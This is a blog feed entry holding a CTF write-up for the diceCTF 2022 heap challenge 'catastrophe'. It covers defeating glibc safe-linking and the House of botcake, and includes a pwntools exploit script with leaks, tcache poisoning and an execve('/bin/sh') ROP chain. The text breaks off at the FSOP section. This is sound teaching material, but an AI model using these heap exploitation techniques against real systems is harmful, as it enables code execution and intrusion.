<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[diceCTF on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/diceCTF/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/diceCTF/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2022-08-16T01:21:31+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/diceCTF/</id>
        
        <entry>
            <title type="html"><![CDATA[[diceCTF 2022 - pwn] catastrophe]]></title>
            <link href="https://nasm.re/posts/catastrophe/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/catastrophe/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-07-28T00:00:00+00:00</published>
            <updated>2022-07-28T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<blockquote>
<p>I just learned how to use malloc and free&hellip; am I doing this right?</p>
</blockquote>
<p>catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic linker, thus I did a first time the challenge with the libc that was in <code>/lib/libc.so.6</code>, then I figured out thanks to my teammate <a
  class="gblog-markdown__link"
  href="../../tags/supersnail"
  
  >supersnail</a
> that I was using the wrong libc. Then I did it again with the right libc but the dynamic linker was (again) wrong and I lost a loot of time on it. So well, the challenge wasn&rsquo;t pretty hard but I took a funny way to solve it because I thought the libc had <code>FULL RELRO</code> while  it had only <code>PARTIAL RELRO</code>. Find the exploit and the tasks <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2022/diceCTF/pwn/catastrophe"
  
  >right here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="tl-dr">
        TL; DR
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#tl-dr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL; DR" href="#tl-dr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>Leak heap address + defeating safe linking by printing the first free&rsquo;d chunk in the tcache.</li>
<li><a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> to create overlapping chunks and get arbitrary write</li>
<li>FSOP on stdout to leak <code>environ</code> and then ROP over the stack.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>catastrophe is a classic heap challenge here are the classic informations about it:</p>
<pre tabindex="0"><code>$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
$ checksec --file libc.so.6 
[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ checksec --file catastrophe 
[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/catastrophe'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p><code>2.35</code> libc, which means there is no more classic hooks like <code>__malloc_hook</code> or <code>__free_hook</code>. The binary allows to:</p>
<ul>
<li>malloc up to 0x200 bytes and read data in it with the use of <code>fgets</code></li>
<li>Allocate from the index 0 to 9</li>
<li>free anything given the index is between 0 and 9</li>
</ul>
<p>Thus we can easily do a <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> but first of all we have to defeat the safe linking to properly getting an arbitrary write.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="defeat-safe-linking">
        Defeat safe-linking
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#defeat-safe-linking" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Defeat safe-linking" href="#defeat-safe-linking">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Since <code>2.32</code> is introduced in the libc the safe-linking mechanism that does some xor encyptions on <code>tcache</code>, <code>fastbin</code> next fp to prevent pointer hiijacking. Here is the core of the mechanism:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
</span><span class="c1"></span><span class="cm">/* Safe-Linking:
</span><span class="cm">   Use randomness from ASLR (mmap_base) to protect single-linked lists
</span><span class="cm">   of Fast-Bins and TCache.  That is, mask the &#34;next&#34; pointers of the
</span><span class="cm">   lists&#39; chunks, and also perform allocation alignment checks on them.
</span><span class="cm">   This mechanism reduces the risk of pointer hijacking, as was done with
</span><span class="cm">   Safe-Unlinking in the double-linked lists of Small-Bins.
</span><span class="cm">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
</span><span class="cm">   larger pages provide less entropy, although the pointer mangling
</span><span class="cm">   still works.  */</span>
<span class="cp">#define PROTECT_PTR(pos, ptr) \
</span><span class="cp">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
</span><span class="cp">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
</span></code></pre></div><p>Since for this challenge we&rsquo;re focused on <code>tcache</code>, here is how a chunk is free&rsquo;d using safe-linking:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175
</span><span class="c1"></span><span class="cm">/* Caller must ensure that we know tc_idx is valid and there&#39;s room
</span><span class="cm">   for more chunks.  */</span>
<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>

  <span class="cm">/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
</span><span class="cm">     detect a double free.  */</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache_key</span><span class="p">;</span>

  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">PROTECT_PTR</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div><p>Thus, the first time a chunk is inserted into a tcache list, <code>e-&gt;next</code> is initialized to <code>&amp;e-&gt;next &gt;&gt; 12</code> (heap base address) xor <code>tcache-&gt;entries[tc_idx]</code> which is equal to zero when the list for a given size is empty.</p>
<p>Which means to leak the heap address we simply have to print a free&rsquo;d chunk once it has been inserted in the tcache.</p>
<p>BUT if we&rsquo;re not able to leak the next fp of a the first chunk linked into a tcachebin that&rsquo;s not major, let&rsquo;s see how we could do differently, here is a chunk linked into the tcache:</p>
<pre tabindex="0"><code>0x5621147a06d0:	0x0000000000000000	0x0000000000000111
0x5621147a06e0:	0x00005624766b4270	0x0d01c2bce1459652
0x5621147a06f0:	0x0000000000000000	0x0000000000000000
0x5621147a0700:	0x0000000000000000	0x0000000000000000
0x5621147a0710:	0x0000000000000000	0x0000000000000000
0x5621147a0720:	0x0000000000000000	0x0000000000000000
0x5621147a0730:	0x0000000000000000	0x0000000000000000
0x5621147a0740:	0x0000000000000000	0x0000000000000000
0x5621147a0750:	0x0000000000000000	0x0000000000000000
0x5621147a0760:	0x0000000000000000	0x0000000000000000
0x5621147a0770:	0x0000000000000000	0x0000000000000000
0x5621147a0780:	0x0000000000000000	0x0000000000000000
0x5621147a0790:	0x0000000000000000	0x0000000000000000
0x5621147a07a0:	0x0000000000000000	0x0000000000000000
0x5621147a07b0:	0x0000000000000000	0x0000000000000000
0x5621147a07c0:	0x0000000000000000	0x0000000000000000
0x5621147a07d0:	0x0000000000000000	0x0000000000000000
0x5621147a07e0:	0x0000000000000000	0x0000000000000111
</code></pre><p>We clearly see the <code>chunk-&gt;next</code> pointer and right after the <code>chunk-&gt;key</code> field. If we decrypt the pointer, it gives: <code>(HeapPos &gt;&gt; 12) ^ encryptedPtr</code>, in our case =&gt; <code>(0x5621147a06e0 &gt;&gt; 12) ^ 0x00005624766b4270</code> = <code>0x5621147a05d0</code>. You should note that between the chunk&rsquo;s location and the the encrypted, the most significant byte plus the nibble right after are the same, here is the reason: when a pointer is encrypted, given the chunk&rsquo;s location is shifted of 12 bits the 12 most significant bits of the pointer are not encrypted at all, which allows us to recover the most significant part of the pointer.</p>
<p>But what can we do with only the 12 most significant bits ? We can recover the whole original pointer. Given we know this part of the pointer, it gives a part of the chunk&rsquo;s location, whith this part we can recover the 12 bits encrypted right after the leaked part, and then we can do it again for the whole pointer.</p>
<p>That is done thanks to the properties of the xor operation, even if the length of the heap addresses grow up the weakness stays the same: by using the base address of the heap and by xor-ing it to another heap address you leave it to being exposed to such attacks and weaknesses.</p>
<p>It ends up to this function (code does not come from me but from <a
  class="gblog-markdown__link"
  href="https://github.com/AeroCTF/aero-ctf-2022/blob/main/tasks/pwn/heap-2022/solution/sploit.py"
  
  >this writeup about a heap challenge from the aeroCTF</a
>):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">decrypt_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">36</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">decrypt_pointer</span><span class="p">(</span><span class="mh">0x00005624766b4270</span><span class="p">)))</span>
<span class="c1"># =&gt; 0x5621147a0000</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="house-of-botcake">
        House of botcake
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#house-of-botcake" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor House of botcake" href="#house-of-botcake">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> gives a write what where primitive by poisoning the tcache. The algorithm is:</p>
<ul>
<li>Allocate 7 <code>0x100</code> sized chunks to then fill the tcache (7 entries).</li>
<li>Allocate two more <code>0x100</code> sized chunks (<code>prev</code> and <code>a</code> in the example).</li>
<li>Allocate a small &ldquo;barrier&rdquo; <code>0x10</code> sized chunk.</li>
<li>Fill the tcache by freeing the first 7 chunks.</li>
<li>free(a), thus <code>a</code> falls into the unsortedbin.</li>
<li>free(prev), thus <code>prev</code> is consolidated with <code>a</code> to create a large <code>0x221</code> sized chunk that is yet in the unsortedbin.</li>
<li>Request one more <code>0x100</code> sized chunk to let a single entry left in the tcache.</li>
<li>free(a) again, given <code>a</code> is part of the large <code>0x221</code> sized chunk it leads to an UAF. Thus <code>a</code> falls into the tcache.</li>
<li>That&rsquo;s finished, to get a write what where we just need to request a <code>0x130</code> sized chunk. Thus we can hiijack the next fp of <code>a</code> that is currently referenced by the tcache by the location we wanna write to. And next time two <code>0x100</code> sized chunks are requested, the second one will be the target location.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="getting-arbitrary-write">
        Getting arbitrary write
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#getting-arbitrary-write" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Getting arbitrary write" href="#getting-arbitrary-write">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To make use of the write what were we got thanks to the <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
>, we need to get both heap and libc leak. To leak libc that&rsquo;s pretty easy, we just need to print out a free&rsquo;d chunk stored into the unsortedbin, its forward pointer is not encrypted with safe-linking.</p>
<p>As seen previously, to bypass safe-linking we have to print a free&rsquo;d chunk once it has been inserted into the tcache. It should give us the base address of the heap. When we got it, we just have to initialize the location we wanna write to <code>location ^ ((heap_base + chunk_offset) &gt;&gt; 12)</code> to encrypt properly the pointer, this way the primitive is efficient.</p>
<p>Implmentation of the <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> + safe-linking bypass, heap and libc leak:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;-</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index?</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="c1"># then we defeated safe linking lol</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="c1"># request back the chunk we used to leak the heap</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># prev</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># a</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># barrier</span>

<span class="c1"># fill tcache</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># free(a) =&gt; unsortedbin</span>
<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1"># free(prev) =&gt; merged with a</span>

<span class="c1"># leak libc</span>
<span class="n">view</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span> <span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x221200</span>
<span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a780</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stdout: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># pop a chunk from the tcache to let an entry left to a </span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># free(a) =&gt; tcache</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stdout</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span> 
<span class="c1"># 0x130, too big for tcache =&gt; unsortedbin UAF on a to replace a-&gt;next with the address of the target location (stdout) </span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="c1"># pop a from tcache</span>

<span class="c1"># next 0x100 request will return the target location (stdout)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x55c4fbcd7a00:	0x0000000000000000	0x0000000000000141 [prev]
</span><span class="s2">0x55c4fbcd7a10:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a20:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a30:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a40:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a50:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a60:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a70:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a80:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7a90:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7aa0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ab0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ac0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ad0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7ae0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7af0:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7b00:	0x5454545454545454	0x5454545454545454
</span><span class="s2">0x55c4fbcd7b10:	0x5454545454545454	0x0000000000000111 [a]
</span><span class="s2">0x55c4fbcd7b20:	0x00007f5d45ff5b57	0x4f60331b73b9000a
</span><span class="s2">0x55c4fbcd7b30:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b40:	0x0000000000000000	0x00000000000000e1 [unsortedbin]
</span><span class="s2">0x55c4fbcd7b50:	0x00007f5819b0dce0	0x00007f5819b0dce0
</span><span class="s2">0x55c4fbcd7b60:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b70:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b80:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7b90:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7ba0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bb0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bc0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bd0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7be0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7bf0:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c00:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c10:	0x0000000000000000	0x0000000000000000
</span><span class="s2">0x55c4fbcd7c20:	0x00000000000000e0	0x0000000000000020
</span><span class="s2">0x55c4fbcd7c30:	0x0068732f6e69622f	0x000000000000000a
</span><span class="s2">0x55c4fbcd7c40:	0x0000000000000000	0x00000000000203c1 [top chunk]
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="fsop-on-stdout-to-leak-environ">
        FSOP on stdout to leak environ
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#fsop-on-stdout-to-leak-environ" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor FSOP on stdout to leak environ" href="#fsop-on-stdout-to-leak-environ">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
